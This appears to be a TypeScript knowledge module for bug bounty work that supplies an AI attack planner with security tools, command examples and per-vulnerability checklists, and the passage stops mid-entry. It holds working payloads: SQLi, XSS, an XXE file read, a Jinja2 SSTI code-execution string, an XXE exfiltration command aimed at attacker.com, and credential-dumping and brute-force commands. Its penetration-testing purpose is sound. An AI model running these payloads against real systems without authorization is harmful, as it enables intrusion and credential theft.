/**
 * Bug Bounty Methodology Knowledge Module
 * 
 * Comprehensive knowledge base derived from:
 * - Bug Bounty Tools mind map (IMG_1772)
 * - awesome-bugbounty-tools (5.8k stars, 200+ tools)
 * - Offensive Linux Security Tools chart (IMG_1773)
 * - Industry-standard bug bounty hunting workflows
 * 
 * This module provides:
 * 1. Phase-ordered methodology workflows
 * 2. Tool recommendations per attack category
 * 3. Vulnerability-specific testing checklists
 * 4. Attack chain patterns for the engagement orchestrator
 * 5. Context injection for the AI attack planner
 */

// ─── Types ─────────────────────────────────────────────────────────────

export interface BugBountyTool {
  name: string;
  description: string;
  category: string;
  phase: BugBountyPhase;
  command_example?: string;
  use_case: string;
  priority: "essential" | "recommended" | "optional";
}

export type BugBountyPhase =
  | "recon"
  | "enumeration"
  | "content_discovery"
  | "vulnerability_scanning"
  | "exploitation"
  | "post_exploitation"
  | "reporting";

export interface AttackMethodology {
  id: string;
  name: string;
  category: string;
  description: string;
  phases: string[];
  tools: string[];
  detection_patterns: string[];
  exploitation_steps: string[];
  impact: string;
  severity_range: string;
  applicable_labs: string[];
  cwe_ids: string[];
}

export interface WorkflowStep {
  phase: BugBountyPhase;
  order: number;
  action: string;
  tools: string[];
  output: string;
  feeds_into: string[];
}

// ─── Bug Bounty Tool Database ──────────────────────────────────────────

const BUG_BOUNTY_TOOLS: BugBountyTool[] = [
  // === RECON: Subdomain Enumeration ===
  { name: "subfinder", description: "Subdomain discovery tool using passive sources", category: "subdomain_enumeration", phase: "recon", command_example: "subfinder -d target.com -o subs.txt", use_case: "Passive subdomain enumeration from multiple sources", priority: "essential" },
  { name: "amass", description: "In-depth attack surface mapping and asset discovery", category: "subdomain_enumeration", phase: "recon", command_example: "amass enum -d target.com -o amass.txt", use_case: "Comprehensive subdomain enumeration with DNS brute-forcing", priority: "essential" },
  { name: "sublist3r", description: "Fast subdomain enumeration using search engines", category: "subdomain_enumeration", phase: "recon", command_example: "sublist3r -d target.com -o subs.txt", use_case: "Quick passive subdomain discovery", priority: "recommended" },
  { name: "massdns", description: "High-performance DNS stub resolver for bulk lookups", category: "subdomain_enumeration", phase: "recon", command_example: "massdns -r resolvers.txt -t A -o S subs.txt", use_case: "Bulk DNS resolution of discovered subdomains", priority: "essential" },
  { name: "puredns", description: "Fast domain resolver with wildcard filtering", category: "subdomain_enumeration", phase: "recon", command_example: "puredns bruteforce wordlist.txt target.com", use_case: "Active subdomain brute-forcing with wildcard detection", priority: "recommended" },
  { name: "shuffledns", description: "Wrapper around massdns for subdomain enumeration", category: "subdomain_enumeration", phase: "recon", command_example: "shuffledns -d target.com -w wordlist.txt -r resolvers.txt", use_case: "Active subdomain brute-forcing with wildcard handling", priority: "recommended" },
  { name: "dnsx", description: "Fast multi-purpose DNS toolkit", category: "subdomain_enumeration", phase: "recon", command_example: "cat subs.txt | dnsx -resp -a -cname", use_case: "DNS record validation and enrichment", priority: "essential" },
  { name: "bbot", description: "Recursive internet scanner for hackers", category: "subdomain_enumeration", phase: "recon", command_example: "bbot -t target.com -f subdomain-enum", use_case: "Automated recursive subdomain discovery", priority: "recommended" },
  { name: "findomain", description: "Cross-platform subdomain enumerator", category: "subdomain_enumeration", phase: "recon", command_example: "findomain -t target.com", use_case: "Fast cross-platform subdomain discovery", priority: "optional" },
  { name: "assetfinder", description: "Find domains and subdomains related to a domain", category: "subdomain_enumeration", phase: "recon", command_example: "assetfinder --subs-only target.com", use_case: "Quick related domain discovery", priority: "recommended" },

  // === RECON: Port Scanning ===
  { name: "nmap", description: "Network mapper and port scanner", category: "port_scanning", phase: "recon", command_example: "nmap -sV -sC -p- -oA scan target.com", use_case: "Comprehensive port scanning with service detection", priority: "essential" },
  { name: "masscan", description: "TCP port scanner, scans entire Internet in under 5 minutes", category: "port_scanning", phase: "recon", command_example: "masscan -p1-65535 --rate 1000 -oJ scan.json target.com", use_case: "Ultra-fast port scanning for large IP ranges", priority: "essential" },
  { name: "rustscan", description: "Modern fast port scanner", category: "port_scanning", phase: "recon", command_example: "rustscan -a target.com -- -sV -sC", use_case: "Fast port scanning that feeds into nmap for service detection", priority: "recommended" },
  { name: "naabu", description: "Fast port scanner written in Go", category: "port_scanning", phase: "recon", command_example: "naabu -host target.com -p - -o ports.txt", use_case: "Quick port scanning with simple output", priority: "recommended" },

  // === RECON: Screenshots ===
  { name: "gowitness", description: "Web screenshot utility using Chrome Headless", category: "screenshots", phase: "recon", command_example: "gowitness file -f urls.txt -P screenshots/", use_case: "Visual inspection of discovered web services", priority: "recommended" },
  { name: "eyewitness", description: "Takes screenshots of websites with header info", category: "screenshots", phase: "recon", command_example: "eyewitness --web -f urls.txt -d output/", use_case: "Visual recon with default credential identification", priority: "recommended" },
  { name: "aquatone", description: "Visual inspection of websites across many hosts", category: "screenshots", phase: "recon", command_example: "cat urls.txt | aquatone -out aquatone/", use_case: "Quick visual overview of HTTP attack surface", priority: "optional" },

  // === RECON: Technology Detection ===
  { name: "wappalyzer", description: "Identify technology on websites", category: "technology_detection", phase: "recon", command_example: "wappalyzer https://target.com", use_case: "Technology stack fingerprinting", priority: "essential" },
  { name: "whatweb", description: "Next generation web scanner", category: "technology_detection", phase: "recon", command_example: "whatweb -v https://target.com", use_case: "Web technology identification", priority: "recommended" },
  { name: "httpx", description: "Fast multi-purpose HTTP toolkit", category: "technology_detection", phase: "recon", command_example: "cat subs.txt | httpx -title -tech-detect -status-code", use_case: "HTTP probing with technology detection", priority: "essential" },
  { name: "wafw00f", description: "Web Application Firewall fingerprinting", category: "technology_detection", phase: "recon", command_example: "wafw00f https://target.com", use_case: "WAF detection before exploitation", priority: "recommended" },

  // === ENUMERATION: Content Discovery ===
  { name: "feroxbuster", description: "Fast recursive content discovery tool in Rust", category: "content_discovery", phase: "enumeration", command_example: "feroxbuster -u https://target.com -w wordlist.txt -x php,html,js", use_case: "Recursive directory and file brute-forcing", priority: "essential" },
  { name: "gobuster", description: "Directory/File, DNS and VHost busting tool", category: "content_discovery", phase: "enumeration", command_example: "gobuster dir -u https://target.com -w wordlist.txt -x php,html", use_case: "Directory and file brute-forcing", priority: "essential" },
  { name: "dirsearch", description: "Web path scanner", category: "content_discovery", phase: "enumeration", command_example: "dirsearch -u https://target.com -e php,html,js", use_case: "Web path discovery with extension filtering", priority: "recommended" },
  { name: "katana", description: "Next-generation crawling and spidering framework", category: "content_discovery", phase: "enumeration", command_example: "katana -u https://target.com -d 3 -o crawl.txt", use_case: "Deep web crawling for endpoint discovery", priority: "essential" },
  { name: "gospider", description: "Fast web spider written in Go", category: "content_discovery", phase: "enumeration", command_example: "gospider -s https://target.com -d 2 -c 10", use_case: "Fast web spidering for link discovery", priority: "recommended" },
  { name: "hakrawler", description: "Simple fast web crawler for endpoint discovery", category: "content_discovery", phase: "enumeration", command_example: "echo https://target.com | hakrawler -d 3", use_case: "Quick endpoint and asset discovery", priority: "recommended" },
  { name: "kiterunner", description: "Fast API endpoint bruteforcer", category: "content_discovery", phase: "enumeration", command_example: "kr scan https://target.com -w routes-large.kite", use_case: "API endpoint discovery for modern web apps", priority: "recommended" },

  // === ENUMERATION: Links & JS Analysis ===
  { name: "linkfinder", description: "Finds endpoints in JavaScript files", category: "js_analysis", phase: "enumeration", command_example: "linkfinder -i https://target.com/app.js -o cli", use_case: "Extract API endpoints from JavaScript files", priority: "essential" },
  { name: "waybackurls", description: "Fetch URLs from Wayback Machine", category: "historical_urls", phase: "enumeration", command_example: "waybackurls target.com | sort -u", use_case: "Historical URL discovery from web archives", priority: "essential" },
  { name: "gau", description: "Fetch known URLs from multiple sources", category: "historical_urls", phase: "enumeration", command_example: "gau target.com | sort -u", use_case: "URL aggregation from AlienVault, Wayback, Common Crawl", priority: "essential" },
  { name: "jsluice", description: "Extract URLs, paths, secrets from JavaScript", category: "js_analysis", phase: "enumeration", command_example: "cat app.js | jsluice urls", use_case: "Deep JS analysis for secrets and endpoints", priority: "recommended" },
  { name: "secretfinder", description: "Find sensitive data in JavaScript files", category: "js_analysis", phase: "enumeration", command_example: "secretfinder -i https://target.com/app.js -o cli", use_case: "API key and secret extraction from JS", priority: "recommended" },

  // === ENUMERATION: Parameters ===
  { name: "arjun", description: "HTTP parameter discovery suite", category: "parameter_discovery", phase: "enumeration", command_example: "arjun -u https://target.com/page", use_case: "Hidden parameter discovery via brute-forcing", priority: "essential" },
  { name: "paramspider", description: "Mining parameters from web archives", category: "parameter_discovery", phase: "enumeration", command_example: "paramspider -d target.com", use_case: "Historical parameter discovery from archives", priority: "recommended" },
  { name: "x8", description: "Hidden parameters discovery suite in Rust", category: "parameter_discovery", phase: "enumeration", command_example: "x8 -u https://target.com/page -w params.txt", use_case: "Fast hidden parameter brute-forcing", priority: "recommended" },

  // === FUZZING ===
  { name: "ffuf", description: "Fast web fuzzer written in Go", category: "fuzzing", phase: "enumeration", command_example: "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302", use_case: "General-purpose web fuzzing", priority: "essential" },
  { name: "wfuzz", description: "Web application fuzzer", category: "fuzzing", phase: "enumeration", command_example: "wfuzz -c -z file,wordlist.txt --hc 404 https://target.com/FUZZ", use_case: "Advanced web fuzzing with filtering", priority: "recommended" },

  // === VULNERABILITY SCANNING ===
  { name: "nuclei", description: "Fast configurable targeted scanning based on templates", category: "vulnerability_scanning", phase: "vulnerability_scanning", command_example: "nuclei -u https://target.com -t cves/ -t vulnerabilities/", use_case: "Template-based vulnerability scanning at scale", priority: "essential" },
  { name: "nikto", description: "Web server scanner", category: "vulnerability_scanning", phase: "vulnerability_scanning", command_example: "nikto -h https://target.com", use_case: "Web server misconfiguration and vulnerability scanning", priority: "essential" },
  { name: "zap", description: "OWASP ZAP - web security testing proxy", category: "vulnerability_scanning", phase: "vulnerability_scanning", command_example: "zap-cli quick-scan https://target.com", use_case: "Comprehensive web application security scanning", priority: "essential" },
  { name: "burpsuite", description: "Web application security testing platform", category: "vulnerability_scanning", phase: "vulnerability_scanning", command_example: "N/A (GUI-based)", use_case: "Manual and automated web app testing", priority: "essential" },
  { name: "sn1per", description: "Automated pentest framework", category: "vulnerability_scanning", phase: "vulnerability_scanning", command_example: "sniper -t target.com -m web", use_case: "Automated reconnaissance and vulnerability scanning", priority: "recommended" },
  { name: "osmedeus", description: "Fully automated offensive security framework", category: "vulnerability_scanning", phase: "vulnerability_scanning", command_example: "osmedeus scan -t target.com", use_case: "End-to-end automated security scanning", priority: "recommended" },

  // === EXPLOITATION: SQL Injection ===
  { name: "sqlmap", description: "Automatic SQL injection and database takeover", category: "sql_injection", phase: "exploitation", command_example: "sqlmap -u 'https://target.com/page?id=1' --batch --dbs", use_case: "Automated SQL injection detection and exploitation", priority: "essential" },
  { name: "nosqlmap", description: "Automated NoSQL database exploitation", category: "sql_injection", phase: "exploitation", command_example: "nosqlmap -u https://target.com/login", use_case: "NoSQL injection detection (MongoDB, CouchDB)", priority: "recommended" },
  { name: "ghauri", description: "Advanced SQL injection detection tool", category: "sql_injection", phase: "exploitation", command_example: "ghauri -u 'https://target.com/page?id=1' --dbs", use_case: "Advanced blind SQL injection exploitation", priority: "recommended" },

  // === EXPLOITATION: XSS ===
  { name: "xsstrike", description: "Most advanced XSS scanner", category: "xss", phase: "exploitation", command_example: "xsstrike -u 'https://target.com/search?q=test'", use_case: "Advanced XSS detection with WAF bypass", priority: "essential" },
  { name: "dalfox", description: "Parameter analysis and XSS scanning tool", category: "xss", phase: "exploitation", command_example: "dalfox url 'https://target.com/search?q=test'", use_case: "Automated XSS scanning with parameter analysis", priority: "essential" },
  { name: "xsser", description: "Cross-site scripting detection and exploitation framework", category: "xss", phase: "exploitation", command_example: "xsser -u 'https://target.com/search?q=XSS'", use_case: "Comprehensive XSS testing framework", priority: "recommended" },
  { name: "xsshunter", description: "Blind XSS detection platform", category: "xss", phase: "exploitation", command_example: "N/A (hosted service)", use_case: "Blind XSS payload management and detection", priority: "recommended" },

  // === EXPLOITATION: SSRF ===
  { name: "ssrfmap", description: "Automatic SSRF fuzzer and exploitation tool", category: "ssrf", phase: "exploitation", command_example: "ssrfmap -r request.txt -p url -m readfiles", use_case: "Automated SSRF detection and exploitation", priority: "essential" },
  { name: "gopherus", description: "Generates gopher links for SSRF exploitation", category: "ssrf", phase: "exploitation", command_example: "gopherus --exploit mysql", use_case: "Generate gopher payloads for SSRF to RCE", priority: "recommended" },
  { name: "singularity", description: "DNS rebinding attack framework", category: "ssrf", phase: "exploitation", command_example: "N/A (framework)", use_case: "DNS rebinding for SSRF exploitation", priority: "optional" },

  // === EXPLOITATION: Command Injection ===
  { name: "commix", description: "Automated OS command injection exploitation", category: "command_injection", phase: "exploitation", command_example: "commix -u 'https://target.com/ping?ip=127.0.0.1'", use_case: "Automated command injection detection and exploitation", priority: "essential" },

  // === EXPLOITATION: CORS ===
  { name: "corsy", description: "CORS misconfiguration scanner", category: "cors", phase: "exploitation", command_example: "corsy -i urls.txt", use_case: "Detect CORS misconfigurations at scale", priority: "recommended" },

  // === EXPLOITATION: CRLF ===
  { name: "crlfuzz", description: "Fast CRLF vulnerability scanner", category: "crlf", phase: "exploitation", command_example: "crlfuzz -u 'https://target.com'", use_case: "CRLF injection detection", priority: "recommended" },

  // === EXPLOITATION: CSRF ===
  { name: "xsrfprobe", description: "CSRF audit and exploitation toolkit", category: "csrf", phase: "exploitation", command_example: "xsrfprobe -u https://target.com/form", use_case: "Cross-site request forgery testing", priority: "recommended" },

  // === EXPLOITATION: Directory Traversal ===
  { name: "dotdotpwn", description: "Directory traversal fuzzer", category: "directory_traversal", phase: "exploitation", command_example: "dotdotpwn -m http -h target.com", use_case: "Path traversal vulnerability fuzzing", priority: "recommended" },

  // === EXPLOITATION: File Inclusion ===
  { name: "lfisuite", description: "Automatic LFI exploiter with reverse shell", category: "file_inclusion", phase: "exploitation", command_example: "lfisuite -u 'https://target.com/page?file=test'", use_case: "Local file inclusion exploitation", priority: "recommended" },

  // === EXPLOITATION: GraphQL ===
  { name: "inql", description: "Burp extension for GraphQL security testing", category: "graphql", phase: "exploitation", command_example: "N/A (Burp extension)", use_case: "GraphQL introspection and injection testing", priority: "essential" },
  { name: "graphqlmap", description: "GraphQL endpoint pentesting engine", category: "graphql", phase: "exploitation", command_example: "graphqlmap -u https://target.com/graphql", use_case: "GraphQL injection and data extraction", priority: "recommended" },
  { name: "clairvoyance", description: "Obtain GraphQL schema despite disabled introspection", category: "graphql", phase: "exploitation", command_example: "clairvoyance https://target.com/graphql -o schema.json", use_case: "GraphQL schema recovery without introspection", priority: "recommended" },

  // === EXPLOITATION: Deserialization ===
  { name: "ysoserial", description: "Java deserialization payload generator", category: "deserialization", phase: "exploitation", command_example: "ysoserial CommonsCollections1 'command'", use_case: "Generate Java deserialization exploit payloads", priority: "essential" },
  { name: "phpggc", description: "PHP unserialize() payload generator", category: "deserialization", phase: "exploitation", command_example: "phpggc Laravel/RCE1 system 'id'", use_case: "Generate PHP deserialization exploit payloads", priority: "recommended" },

  // === EXPLOITATION: Open Redirect ===
  { name: "oralyzer", description: "Open redirection analyzer", category: "open_redirect", phase: "exploitation", command_example: "oralyzer -u 'https://target.com/redirect?url=test'", use_case: "Open redirect vulnerability detection", priority: "recommended" },

  // === EXPLOITATION: Race Condition ===
  { name: "turbo-intruder", description: "Burp extension for high-speed HTTP requests", category: "race_condition", phase: "exploitation", command_example: "N/A (Burp extension)", use_case: "Race condition exploitation via request flooding", priority: "essential" },

  // === EXPLOITATION: Request Smuggling ===
  { name: "smuggler", description: "HTTP request smuggling testing tool", category: "request_smuggling", phase: "exploitation", command_example: "smuggler -u https://target.com", use_case: "HTTP request smuggling detection (CL.TE, TE.CL)", priority: "recommended" },

  // === EXPLOITATION: SSTI ===
  { name: "tplmap", description: "Server-side template injection detection and exploitation", category: "ssti", phase: "exploitation", command_example: "tplmap -u 'https://target.com/page?name=test'", use_case: "SSTI detection and exploitation across template engines", priority: "essential" },
  { name: "sstimap", description: "Automatic SSTI detection with interactive interface", category: "ssti", phase: "exploitation", command_example: "sstimap -u 'https://target.com/page?name=test'", use_case: "SSTI exploitation with code execution", priority: "recommended" },

  // === EXPLOITATION: XXE ===
  { name: "xxeinjector", description: "Automatic XXE exploitation tool", category: "xxe", phase: "exploitation", command_example: "xxeinjector --host=attacker.com --file=/etc/passwd", use_case: "Automated XXE injection and data exfiltration", priority: "essential" },
  { name: "dtd-finder", description: "List DTDs and generate XXE payloads", category: "xxe", phase: "exploitation", command_example: "dtd-finder /path/to/jar", use_case: "Find local DTDs for XXE exploitation", priority: "recommended" },

  // === EXPLOITATION: WAF Evasion ===
  { name: "nomore403", description: "Tool to bypass 403/40X restrictions", category: "waf_evasion", phase: "exploitation", command_example: "nomore403 -u https://target.com/admin", use_case: "Bypass 403 forbidden responses", priority: "recommended" },
  { name: "nowafpls", description: "Burp plugin to bypass WAFs via junk data", category: "waf_evasion", phase: "exploitation", command_example: "N/A (Burp extension)", use_case: "WAF bypass through request mutation", priority: "optional" },

  // === MISCELLANEOUS: Secrets ===
  { name: "gitleaks", description: "Scan git repos for secrets using regex and entropy", category: "secret_scanning", phase: "enumeration", command_example: "gitleaks detect -s /path/to/repo", use_case: "Git repository secret scanning", priority: "essential" },
  { name: "trufflehog", description: "Search git repos for high entropy strings and secrets", category: "secret_scanning", phase: "enumeration", command_example: "trufflehog git https://github.com/target/repo", use_case: "Deep git history secret scanning", priority: "essential" },
  { name: "noseyparker", description: "Find secrets in textual data and Git history", category: "secret_scanning", phase: "enumeration", command_example: "noseyparker scan --datastore np.db /path/to/repo", use_case: "Enterprise-grade secret detection", priority: "recommended" },

  // === MISCELLANEOUS: JWT ===
  { name: "jwt_tool", description: "JWT testing, tweaking and cracking toolkit", category: "jwt", phase: "exploitation", command_example: "jwt_tool eyJ... -T -S hs256 -p 'secret'", use_case: "JWT vulnerability testing and exploitation", priority: "essential" },

  // === MISCELLANEOUS: Subdomain Takeover ===
  { name: "subjack", description: "Subdomain takeover tool", category: "subdomain_takeover", phase: "exploitation", command_example: "subjack -w subs.txt -t 100 -timeout 30", use_case: "Detect subdomain takeover vulnerabilities", priority: "recommended" },
  { name: "subzy", description: "Subdomain takeover via response fingerprints", category: "subdomain_takeover", phase: "exploitation", command_example: "subzy run --targets subs.txt", use_case: "Fast subdomain takeover detection", priority: "recommended" },
  { name: "dnsreaper", description: "Sub-domain takeover tool with emphasis on accuracy", category: "subdomain_takeover", phase: "exploitation", command_example: "dnsreaper scan target.com", use_case: "Accurate subdomain takeover scanning", priority: "recommended" },

  // === MISCELLANEOUS: Buckets ===
  { name: "s3scanner", description: "Scan for open AWS S3 buckets", category: "cloud_storage", phase: "enumeration", command_example: "s3scanner scan --buckets-file buckets.txt", use_case: "AWS S3 bucket misconfiguration scanning", priority: "recommended" },
  { name: "cloudbrute", description: "Cloud storage enumerator", category: "cloud_storage", phase: "enumeration", command_example: "cloudbrute -d target.com -k wordlist.txt", use_case: "Multi-cloud storage bucket enumeration", priority: "recommended" },

  // === MISCELLANEOUS: CMS ===
  { name: "wpscan", description: "WordPress security scanner", category: "cms", phase: "vulnerability_scanning", command_example: "wpscan --url https://target.com -e ap,at,u", use_case: "WordPress vulnerability scanning", priority: "essential" },
  { name: "cmsmap", description: "Open source CMS scanner", category: "cms", phase: "vulnerability_scanning", command_example: "cmsmap https://target.com", use_case: "Multi-CMS vulnerability scanning", priority: "recommended" },
  { name: "joomscan", description: "Joomla vulnerability scanner", category: "cms", phase: "vulnerability_scanning", command_example: "joomscan -u https://target.com", use_case: "Joomla-specific vulnerability scanning", priority: "optional" },

  // === MISCELLANEOUS: Passwords ===
  { name: "hydra", description: "Parallelized login cracker", category: "password_attacks", phase: "exploitation", command_example: "hydra -l admin -P passwords.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'", use_case: "Online password brute-forcing", priority: "essential" },
  { name: "patator", description: "Multi-purpose brute-forcer", category: "password_attacks", phase: "exploitation", command_example: "patator http_fuzz url=https://target.com/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt", use_case: "Flexible multi-protocol brute-forcing", priority: "recommended" },

  // === MISCELLANEOUS: Proxy ===
  { name: "mitmproxy", description: "Interactive TLS-capable intercepting HTTP proxy", category: "proxy", phase: "enumeration", command_example: "mitmproxy -p 8080", use_case: "HTTP/HTTPS traffic interception and modification", priority: "recommended" },
  { name: "proxify", description: "Versatile proxy for capturing HTTP/HTTPS traffic", category: "proxy", phase: "enumeration", command_example: "proxify -o traffic.log", use_case: "Traffic capture and replay for analysis", priority: "optional" },

  // === MISCELLANEOUS: Useful Utilities ===
  { name: "interactsh", description: "Out-of-band interaction detection tool", category: "utility", phase: "exploitation", command_example: "interactsh-client", use_case: "Detect blind vulnerabilities via OOB callbacks", priority: "essential" },
  { name: "anew", description: "Add new lines to files, skipping duplicates", category: "utility", phase: "recon", command_example: "cat new_subs.txt | anew all_subs.txt", use_case: "Deduplicate and merge recon results", priority: "recommended" },
  { name: "gf", description: "Wrapper around grep for pattern matching", category: "utility", phase: "enumeration", command_example: "cat urls.txt | gf xss", use_case: "Filter URLs for specific vulnerability patterns", priority: "recommended" },
  { name: "qsreplace", description: "Replace query string values in URLs", category: "utility", phase: "enumeration", command_example: "cat urls.txt | qsreplace 'FUZZ'", use_case: "Prepare URLs for fuzzing by replacing parameters", priority: "recommended" },

  // === POST-EXPLOITATION ===
  { name: "metasploit", description: "Penetration testing framework", category: "post_exploitation", phase: "post_exploitation", command_example: "msfconsole -x 'use exploit/multi/handler; set PAYLOAD ...; run'", use_case: "Post-exploitation and lateral movement", priority: "essential" },
  { name: "mimikatz", description: "Windows credential extraction tool", category: "post_exploitation", phase: "post_exploitation", command_example: "mimikatz.exe 'sekurlsa::logonpasswords'", use_case: "Windows credential dumping", priority: "essential" },
  { name: "bloodhound", description: "Active Directory attack path mapping", category: "post_exploitation", phase: "post_exploitation", command_example: "bloodhound-python -d domain.local -u user -p pass", use_case: "AD privilege escalation path discovery", priority: "recommended" },
];

// ─── Attack Methodology Database ───────────────────────────────────────

const ATTACK_METHODOLOGIES: AttackMethodology[] = [
  {
    id: "sqli-methodology",
    name: "SQL Injection Testing",
    category: "injection",
    description: "Systematic testing for SQL injection vulnerabilities across all input vectors",
    phases: ["Identify injection points (params, headers, cookies)", "Test for error-based SQLi with single quotes and special chars", "Test for blind SQLi (boolean-based and time-based)", "Test for UNION-based SQLi to extract data", "Test for stacked queries", "Attempt database enumeration and data exfiltration", "Test for second-order SQLi"],
    tools: ["sqlmap", "ghauri", "nosqlmap", "burpsuite"],
    detection_patterns: ["SQL syntax error", "mysql_fetch", "ORA-", "ODBC", "unclosed quotation mark", "pg_query", "SQLite3::"],
    exploitation_steps: ["1. Confirm injection with ' OR 1=1--", "2. Determine column count with ORDER BY", "3. Find displayable columns with UNION SELECT NULL,...", "4. Extract database version and user", "5. Enumerate databases, tables, columns", "6. Extract sensitive data"],
    impact: "Full database compromise, data exfiltration, authentication bypass, potential RCE via xp_cmdshell or INTO OUTFILE",
    severity_range: "High-Critical",
    applicable_labs: ["dvwa", "bwapp", "mutillidae", "juice-shop", "webgoat"],
    cwe_ids: ["CWE-89", "CWE-564"]
  },
  {
    id: "xss-methodology",
    name: "Cross-Site Scripting Testing",
    category: "injection",
    description: "Comprehensive XSS testing across reflected, stored, and DOM-based vectors",
    phases: ["Map all input reflection points", "Test reflected XSS with basic payloads", "Test stored XSS in persistent fields", "Test DOM-based XSS via JS sinks", "Test XSS in unusual contexts (attributes, JS, CSS)", "Attempt WAF bypass with encoding/obfuscation", "Chain XSS with CSRF or session hijacking"],
    tools: ["xsstrike", "dalfox", "xsser", "xsshunter", "burpsuite"],
    detection_patterns: ["<script>", "onerror=", "onload=", "javascript:", "document.cookie", "alert(", "eval("],
    exploitation_steps: ["1. Inject <script>alert(1)</script> in all params", "2. Try event handlers: <img src=x onerror=alert(1)>", "3. Test attribute injection: \" onmouseover=alert(1)", "4. Try SVG payloads: <svg/onload=alert(1)>", "5. Test DOM sinks: location.hash, innerHTML", "6. Bypass filters with encoding: &#x3C;script&#x3E;"],
    impact: "Session hijacking, credential theft, defacement, phishing, keylogging",
    severity_range: "Medium-High",
    applicable_labs: ["dvwa", "bwapp", "mutillidae", "juice-shop", "webgoat"],
    cwe_ids: ["CWE-79"]
  },
  {
    id: "ssrf-methodology",
    name: "Server-Side Request Forgery Testing",
    category: "server_side",
    description: "Testing for SSRF to access internal services, cloud metadata, and bypass network restrictions",
    phases: ["Identify URL/IP input parameters", "Test basic SSRF with localhost and internal IPs", "Test cloud metadata endpoints (169.254.169.254)", "Test protocol smuggling (gopher://, file://, dict://)", "Test DNS rebinding attacks", "Attempt SSRF to RCE via internal services", "Test blind SSRF with OOB callbacks"],
    tools: ["ssrfmap", "gopherus", "interactsh", "burpsuite", "singularity"],
    detection_patterns: ["url=", "path=", "src=", "dest=", "redirect=", "uri=", "window=", "next=", "data=", "reference=", "site=", "html="],
    exploitation_steps: ["1. Test http://127.0.0.1 and http://localhost", "2. Test http://169.254.169.254/latest/meta-data/ (AWS)", "3. Test http://metadata.google.internal/ (GCP)", "4. Try IP bypass: http://0x7f000001, http://2130706433", "5. Try DNS rebinding with attacker-controlled domain", "6. Use gopher:// for internal service exploitation"],
    impact: "Internal network access, cloud credential theft, RCE via internal services",
    severity_range: "High-Critical",
    applicable_labs: ["juice-shop", "crapi", "webgoat"],
    cwe_ids: ["CWE-918"]
  },
  {
    id: "idor-methodology",
    name: "Insecure Direct Object Reference Testing",
    category: "access_control",
    description: "Testing for broken access control through direct object reference manipulation",
    phases: ["Map all endpoints with object references (IDs, UUIDs)", "Create two test accounts with different privileges", "Swap object references between accounts", "Test sequential ID enumeration", "Test parameter pollution for access bypass", "Test horizontal and vertical privilege escalation"],
    tools: ["autorize", "burpsuite", "curl"],
    detection_patterns: ["id=", "user_id=", "account=", "order_id=", "doc=", "profile=", "edit=", "delete="],
    exploitation_steps: ["1. Identify all API endpoints with object IDs", "2. Login as user A, capture request with ID", "3. Replace ID with user B's ID", "4. Check if data/action is accessible", "5. Test with admin-level object IDs", "6. Try UUID prediction or sequential enumeration"],
    impact: "Unauthorized data access, account takeover, privilege escalation",
    severity_range: "Medium-Critical",
    applicable_labs: ["crapi", "juice-shop", "dvwa", "bwapp"],
    cwe_ids: ["CWE-639", "CWE-284"]
  },
  {
    id: "api-security-methodology",
    name: "API Security Testing",
    category: "api",
    description: "Comprehensive API security testing covering OWASP API Top 10",
    phases: ["Discover API endpoints and documentation", "Test authentication mechanisms (JWT, OAuth, API keys)", "Test authorization (BOLA/IDOR on all endpoints)", "Test rate limiting and resource consumption", "Test mass assignment and parameter tampering", "Test injection in API parameters", "Test for excessive data exposure", "Test for security misconfiguration"],
    tools: ["burpsuite", "kiterunner", "arjun", "jwt_tool", "nuclei", "curl"],
    detection_patterns: ["/api/", "/v1/", "/v2/", "/graphql", "swagger", "openapi", ".json", "Authorization: Bearer"],
    exploitation_steps: ["1. Enumerate API with swagger/openapi docs", "2. Test BOLA: change object IDs in all endpoints", "3. Test BFLA: access admin endpoints as regular user", "4. Test mass assignment: add admin=true to registration", "5. Test JWT: none algorithm, weak secret, expired tokens", "6. Test rate limiting: send 1000+ requests rapidly", "7. Check for excessive data in responses"],
    impact: "Full API compromise, data breach, account takeover, privilege escalation",
    severity_range: "Medium-Critical",
    applicable_labs: ["crapi", "vampi", "juice-shop", "dvga"],
    cwe_ids: ["CWE-284", "CWE-639", "CWE-918", "CWE-200"]
  },
  {
    id: "xxe-methodology",
    name: "XML External Entity Injection",
    category: "injection",
    description: "Testing for XXE in XML parsers to read files, SSRF, and DoS",
    phases: ["Identify XML input points (uploads, API, SOAP)", "Test basic XXE with file:// protocol", "Test blind XXE with OOB exfiltration", "Test XXE via file uploads (DOCX, SVG, XLSX)", "Test for billion laughs DoS", "Attempt XXE to SSRF chain"],
    tools: ["xxeinjector", "dtd-finder", "docem", "burpsuite"],
    detection_patterns: ["Content-Type: application/xml", "Content-Type: text/xml", "<!DOCTYPE", "<!ENTITY", ".xml", "SOAP"],
    exploitation_steps: ["1. Inject basic XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "2. Test blind XXE with external DTD", "3. Try parameter entities for OOB exfiltration", "4. Upload SVG with XXE payload", "5. Test DOCX/XLSX with embedded XXE"],
    impact: "File disclosure, SSRF, denial of service, potential RCE",
    severity_range: "High-Critical",
    applicable_labs: ["bwapp", "mutillidae", "webgoat", "dvga"],
    cwe_ids: ["CWE-611"]
  },
  {
    id: "ssti-methodology",
    name: "Server-Side Template Injection",
    category: "injection",
    description: "Testing for template injection to achieve code execution on the server",
    phases: ["Identify template rendering points", "Test with polyglot payloads: {{7*7}}, ${7*7}, #{7*7}", "Identify template engine from error messages", "Escalate from detection to code execution", "Attempt file read and RCE"],
    tools: ["tplmap", "sstimap", "burpsuite"],
    detection_patterns: ["{{", "${", "#{", "<%", "{%", "49", "7777777"],
    exploitation_steps: ["1. Inject {{7*7}} in all input fields", "2. If 49 appears, SSTI confirmed", "3. Identify engine: {{7*'7'}} → Jinja2 if '7777777'", "4. Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "5. Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"],
    impact: "Remote code execution, full server compromise",
    severity_range: "Critical",
    applicable_labs: ["bwapp", "mutillidae"],
    cwe_ids: ["CWE-1336"]
  },
  {
    id: "broken-auth-methodology",
    name: "Broken Authentication Testing",
    category: "authentication",
    description: "Testing for authentication bypass, weak credentials, and session management flaws",
